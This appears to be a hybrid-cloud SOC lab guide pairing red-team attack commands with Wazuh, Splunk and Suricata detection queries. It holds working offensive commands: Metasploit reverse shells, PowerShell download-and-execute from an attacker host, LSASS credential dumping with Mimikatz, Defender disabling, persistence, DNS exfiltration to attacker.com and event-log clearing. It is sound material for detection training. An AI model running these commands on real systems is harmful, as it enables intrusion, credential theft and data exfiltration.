# Attack Simulation Guide - Hybrid Cloud SOC Lab

## Overview
This document provides step-by-step Red Team commands and Blue Team validation checks for the Hybrid Cloud SOC Lab. Each attack maps to MITRE ATT&CK techniques and triggers specific detection rules in Wazuh (VM1) and Suricata/Splunk (VM2).

---

## Lab Environment
| Component | IP Range | Role |
|-----------|----------|------|
| Windows Target | 10.0.1.10/24 | Victim Endpoint (Sysmon + Wazuh Agent) |
| VM1 (Wazuh + n8n) | 10.0.2.4/24 | Tier 1 SIEM/SOAR |
| VM2 (Splunk + Suricata) | 10.0.2.5/24 | Tier 2 Analytics/NIDS |
| Attacker | 10.0.3.5/24 | Metasploit/C2 Framework |

---

## Attack Scenarios

### 1. Initial Access - Phishing with Malicious Payload
**MITRE**: T1566.001 (Phishing: Spearphishing Attachment)

#### Red Team Commands
```bash
# On Attacker (Metasploit)
msfconsole -r metasploit_c2.rc

# Generate payload
use payload/windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.3.5
set LPORT 4444
generate -f exe -o /tmp/payload.exe

# Deliver via HTTP
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set SRVHOST 10.0.3.5
set SRVPORT 8080
set URIPATH /payload
run -j

# On Target (simulate user click)
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.3.5:8080/payload')"
```

#### Blue Team Validation
**Wazuh (VM1) - Check Alerts:**
```bash
# Query Wazuh API for Sysmon Event ID 1 (Process Creation)
curl -k -u wazuh:StrongPassword123! \
  "https://10.0.2.4:55000/alerts?rule.groups=sysmon&winlog.event_id=1&limit=10"

# Expected Rule IDs: 100001-100008 (LOLBin detection)
# Expected MITRE: T1059.001, T1105, T1218.x
```

**Splunk (VM2) - SPL Query:**
```spl
index=main sourcetype=wazuh_json rule.level>=10 winlog.event_id=1
| eval process=win.eventdata.image, cmd=win.eventdata.commandline
| table _time agent.name rule.description process cmd rule.mitre.id
| head 20
```

---

### 2. Execution - PowerShell Encoded Command
**MITRE**: T1059.001 (Command and Scripting Interpreter: PowerShell), T1027 (Obfuscated/Stored Files)

#### Red Team Commands
```powershell
# On Target - Encoded PowerShell command
$cmd = "IEX (New-Object Net.WebClient).DownloadString('http://10.0.3.5:8080/payload')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Alternative: Direct download and execute
certutil -urlcache -split -f http://10.0.3.5:8080/payload.exe C:\Temp\payload.exe
C:\Temp\payload.exe
```

#### Blue Team Validation
**Wazuh Rules Triggered:** 100001 (PowerShell -enc), 100002 (Certutil decode)

**Splunk SPL:**
```spl
index=main sourcetype=wazuh_json rule.id IN (100001,100002)
| stats count by agent.name rule.description win.eventdata.image win.eventdata.commandline
```

**Suricata Alert Check:**
```bash
# Check eve.json for HTTP payload delivery
grep -i "payload\|certutil\|powershell" /var/log/suricata/eve.json | jq .
```

---

### 3. Credential Access - LSASS Memory Dump (T1003.001)
**MITRE**: T1003.001 (OS Credential Dumping: LSASS Memory)

#### Red Team Commands
```powershell
# Method 1: Built-in Windows tools (COM+ Services)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full

# Method 2: ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Method 3: PowerShell (Invoke-Mimikatz / Invoke-Expression)
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds

# Method 4: Meterpreter (post-exploitation)
# meterpreter > load kiwi
# meterpreter > creds_all
```

#### Blue Team Validation
**Wazuh Rules Triggered:** 100020 (CreateRemoteThread -> LSASS), 100030/100031 (Process Access LSASS)

**Critical Alert - Level 12:**
```bash
# Wazuh API - Critical LSASS alerts
curl -k -u wazuh:StrongPassword123! \
  "https://10.0.2.4:55000/alerts?rule.level=12&rule.groups=sysmon&limit=20"

# Expected: rule.id 100030/100031 with granted_access 0x1010 or 0x1F0FFF
```

**Splunk SPL - LSASS Access:**
```spl
index=main sourcetype=wazuh_json (win.eventdata.targetimage="*lsass.exe" OR win.eventdata.grantedaccess IN ("0x1010","0x1f0fff","0x001fffff"))
| eval src_proc=win.eventdata.image, tgt_proc=win.eventdata.targetimage, access=win.eventdata.grantedaccess
| stats count min(_time) as earliest max(_time) as latest by agent.name src_proc tgt_proc access rule.description
| convert ctime(earliest) ctime(latest)
```

**Suricata Detection:**
```spl
index=main sourcetype=suricata_eve event_type=alert alert.signature_id IN (2000001,2000002,2000003,2000004)
| table _time src_ip dest_ip alert.signature alert.severity alert.category
```

---

### 4. Persistence - Registry Run Key
**MITRE**: T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys)

#### Red Team Commands
```powershell
# Registry Run Key (HKLM - requires Admin)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\Temp\payload.exe" /f

# Registry Run Key (HKCU - user level)
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveUpdate" /t REG_SZ /d "C:\Temp\payload.exe" /f

# Scheduled Task
schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\Temp\payload.exe" /sc onlogon /rl highest /f

# WMI Event Subscription
$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{Name="WindowsUpdateFilter"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 0"}
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{Name="WindowsUpdateConsumer"; ExecutablePath="C:\Temp\payload.exe"; CommandLineTemplate="C:\Temp\payload.exe"}
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{Filter=$filter; Consumer=$consumer}
```

#### Blue Team Validation
**Wazuh Rules Triggered:** 100050 (Registry Run), 100060 (WMI Subscription)

**Splunk SPL:**
```spl
index=main sourcetype=wazuh_json (rule.id=100050 OR rule.id=100060)
| table _time agent.name win.eventdata.targetobject win.eventdata.details rule.description
```

---

### 5. Defense Evasion - Disable Windows Defender
**MITRE**: T1562.001 (Impair Defenses: Disable or Modify Tools)

#### Red Team Commands
```powershell
# Disable Real-time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable Behavior Monitoring
Set-MpPreference -DisableBehaviorMonitoring $true

# Disable Script Scanning
Set-MpPreference -DisableScriptScanning $true

# Add exclusion for payload directory
Add-MpPreference -ExclusionPath "C:\Temp"

# Disable via Registry (requires reboot)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f
```

#### Blue Team Validation
**Wazuh Rules Triggered:** 100053 (WDigest), Sysmon Event ID 13 (Registry modification)

**Splunk SPL:**
```spl
index=main sourcetype=wazuh_json win.eventdata.targetobject="*Windows Defender*"
| table _time agent.name win.eventdata.targetobject win.eventdata.details rule.description
```

---

### 6. Lateral Movement - SMB/PsExec
**MITRE**: T1021.002 (Remote Services: SMB/Windows Admin Shares)

#### Red Team Commands
```bash
# On Attacker - PsExec
use exploit/windows/smb/psexec
set RHOSTS 10.0.1.10
set SMBUser administrator
set SMBPass <password_or_hash>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.3.5
run

# WMI
use exploit/windows/wmi/wmi_exec
set RHOSTS 10.0.1.10
set SMBUser administrator
set SMBPass <password_or_hash>
run
```

#### Blue Team Validation
**Suricata Rules Triggered:** 2000200 (NTLM Relay), 2000201 (PsExec)

**Splunk SPL:**
```spl
index=main sourcetype=suricata_eve alert.signature_id IN (2000200,2000201,2000202)
| table _time src_ip dest_ip alert.signature alert.severity
```

**Wazuh - Auth Events:**
```spl
index=main sourcetype=wazuh_json winlog.event_id IN (4624,4625) win.eventdata.logontype=3
| stats count by win.eventdata.targetusername src_ip win.eventdata.logontype
```

---

### 7. Command & Control - Metasploit Reverse TCP/HTTP
**MITRE**: T1071.001 (Application Layer Protocol: Web Protocols), T1573 (Encrypted Channel)

#### Red Team Commands
```bash
# Reverse TCP (Port 4444) - Detected by Suricata 2000030
# Reverse HTTP (Port 8080) - Detected by Suricata 2000010/2000011
# Reverse HTTPS (Port 8443) - Encrypted, requires SSL inspection

# Meterpreter C2 commands
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
meterpreter > keylog_start
meterpreter > screenshot
meterpreter > shell
```

#### Blue Team Validation
**Suricata Detection:**
```bash
# Real-time monitoring
tail -f /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'

# SPL for C2 alerts
index=main sourcetype=suricata_eve event_type=alert
| stats count by alert.signature alert.signature_id src_ip dest_ip
| sort -count
```

**Wazuh - Network Connections (Sysmon Event ID 3):**
```spl
index=main sourcetype=wazuh_json winlog.event_id=3
| eval suspicious_port=case(match(win.eventdata.destinationport,"^(4444|5555|6666|7777|8888|9999|1234|31337)$"),"YES",1=1,"NO")
| where suspicious_port="YES"
| table _time agent.name win.eventdata.image win.eventdata.destinationip win.eventdata.destinationport
```

---

### 8. Exfiltration - Data Staging and Transfer
**MITRE**: T1005 (Data from Local System), T1041 (Exfiltration Over C2 Channel)

#### Red Team Commands
```powershell
# Stage sensitive files
mkdir C:\Temp\staging
copy C:\Users\*\Documents\*.pdf C:\Temp\staging\
copy C:\Users\*\Desktop\*.xlsx C:\Temp\staging\

# Compress
Compress-Archive -Path C:\Temp\staging\* -DestinationPath C:\Temp\exfil.zip

# Exfiltrate via C2
# meterpreter > upload C:\Temp\exfil.zip /tmp/

# Alternative: DNS Exfiltration (detected by Suricata 2000020)
powershell -c "$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Temp\exfil.zip')); $parts = $data -split '(.{200})' | ?{$_}; foreach($p in $parts) {Resolve-DnsName -Name \"$p.exfil.attacker.com\" -Server 10.0.3.5}"
```

#### Blue Team Validation
**Suricata - Large Transfer (2000500):**
```spl
index=main sourcetype=suricata_eve event_type=flow flow.bytes_toclient > 104857600
| table _time src_ip dest_ip flow.bytes_toclient flow.bytes_toserver
```

**Suricata - DNS Exfiltration (2000020):**
```spl
index=main sourcetype=suricata_eve event_type=alert alert.signature_id=2000020
| table _time src_ip dns.query
```

---

## Blue Team Hunting Queries

### Splunk - Comprehensive Hunt Queries

#### 1. All Critical Alerts (Last 24h)
```spl
index=main (sourcetype=wazuh_json rule.level>=12) OR (sourcetype=suricata_eve alert.severity<=2)
| eval source=case(sourcetype="wazuh_json","Wazuh",sourcetype="suricata_eve","Suricata")
| stats count min(_time) as earliest max(_time) as latest by source rule.description alert.signature agent.name src_ip dest_ip
| convert ctime(earliest) ctime(latest)
| sort -count
```

#### 2. Process Injection Chain
```spl
index=main sourcetype=wazuh_json
| where winlog.event_id IN (8,10) AND win.eventdata.targetimage="*lsass.exe"
| transaction agent.name maxspan=5m
| where eventcount > 1
| table _time agent.name win.eventdata.image win.eventdata.targetimage win.eventdata.grantedaccess
```

#### 3. LOLBin Execution Timeline
```spl
index=main sourcetype=wazuh_json rule.id IN (100001,100002,100003,100004,100005,100006,100007,100008)
| eval lolbin=win.eventdata.image, cmd=win.eventdata.commandline
| stats count values(cmd) as commands by agent.name lolbin rule.description
| sort -count
```

#### 4. Network Beaconing Detection
```spl
index=main sourcetype=suricata_eve event_type=flow
| stats count dc(dest_port) as ports values(dest_ip) as destinations by src_ip
| where count > 20 AND mvcount(destinations) = 1
| eval beacon_score = count * 10
| sort -beacon_score
```

#### 5. MITRE ATT&CK Coverage
```spl
index=main sourcetype=wazuh_json rule.mitre.id=*
| eval mitre=mvindex(rule.mitre.id,0)
| stats count by mitre
| join type=left mitre [| inputlookup mitre_attack_lookup]
| table mitre name tactic count
| sort tactic, -count
```

---

## Wazuh Dashboard Queries (Kibana/OpenSearch DSL)

### Critical Alerts Dashboard
```json
GET /wazuh-alerts-*/_search
{
  "size": 0,
  "query": {
    "bool": {
      "filter": [
        { "range": { "@timestamp": { "gte": "now-24h" }}},
        { "range": { "rule.level": { "gte": 12 }}}
      ]
    }
  },
  "aggs": {
    "by_rule": {
      "terms": { "field": "rule.id", "size": 20 },
      "aggs": {
        "by_agent": { "terms": { "field": "agent.name", "size": 10 }},
        "mitre": { "terms": { "field": "rule.mitre.id", "size": 10 }}
      }
    }
  }
}
```

### Process Tree Analysis
```json
GET /wazuh-alerts-*/_search
{
  "size": 100,
  "query": {
    "bool": {
      "must": [
        { "term": { "winlog.event_id": 1 }},
        { "wildcard": { "win.eventdata.image": "*powershell*" }}
      ],
      "filter": { "range": { "@timestamp": { "gte": "now-1h" }}}
    }
  },
  "sort": [{ "@timestamp": { "order": "desc" }}]
}
```

---

## Validation Checklist

### After Each Attack, Verify:

| Check | Wazuh (VM1) | Splunk (VM2) | Suricata (VM2) |
|-------|-------------|--------------|----------------|
| Alert Generated | ✅ Rule ID in alerts | ✅ Indexed event | ✅ eve.json alert |
| Level 12+ Alert | ✅ Forwarded via syslog | ✅ Received on 514 | N/A |
| MITRE Tags | ✅ rule.mitre.id populated | ✅ Extracted field | ✅ alert.signature_id |
| IOC Extraction | ✅ Hashes, IPs in fields | ✅ JSON parsed | ✅ HTTP/DNS fields |
| n8n Enrichment | ✅ Webhook triggered | ✅ VT lookup done | N/A |
| Slack Notification | ✅ Card posted | N/A | N/A |

### Key Log Locations
| Component | Log Path |
|-----------|----------|
| Wazuh Manager Alerts | `/var/ossec/logs/alerts/alerts.json` |
| Wazuh Agent (Windows) | `C:\Program Files (x86)\ossec-agent\logs\ossec.log` |
| Sysmon Events | Windows Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational |
| Suricata EVE | `/var/log/suricata/eve.json` |
| Suricata Stats | `/var/log/suricata/stats.log` |
| Splunk Indexed | `index=main sourcetype=wazuh_json OR sourcetype=suricata_eve` |

---

## Cleanup Commands

### Red Team Cleanup
```powershell
# Remove persistence
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /f
reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveUpdate" /f
schtasks /delete /tn "WindowsDefenderUpdate" /f

# Remove staged files
Remove-Item C:\Temp\payload.exe -Force -ErrorAction SilentlyContinue
Remove-Item C:\Temp\lsass.dmp -Force -ErrorAction SilentlyContinue
Remove-Item C:\Temp\exfil.zip -Force -ErrorAction SilentlyContinue
Remove-Item C:\Temp\staging -Recurse -Force -ErrorAction SilentlyContinue

# Re-enable Defender
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false

# Clear Event Logs (requires Admin)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

### Blue Team Reset
```bash
# VM1 - Restart Wazuh
docker restart wazuh-manager

# VM2 - Restart services
systemctl restart suricata
sudo -u splunk /opt/splunk/bin/splunk restart

# Clear Suricata logs
> /var/log/suricata/eve.json
> /var/log/suricata/stats.log
```

---

## References
- MITRE ATT&CK: https://attack.mitre.org/
- Sysmon Event IDs: https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon
- Wazuh Rules: https://documentation.wazuh.com/current/user-manual/ruleset/
- Suricata Rules: https://suricata.readthedocs.io/en/latest/rules/
- Splunk SPL: https://docs.splunk.com/Documentation/Splunk/latest/SearchReference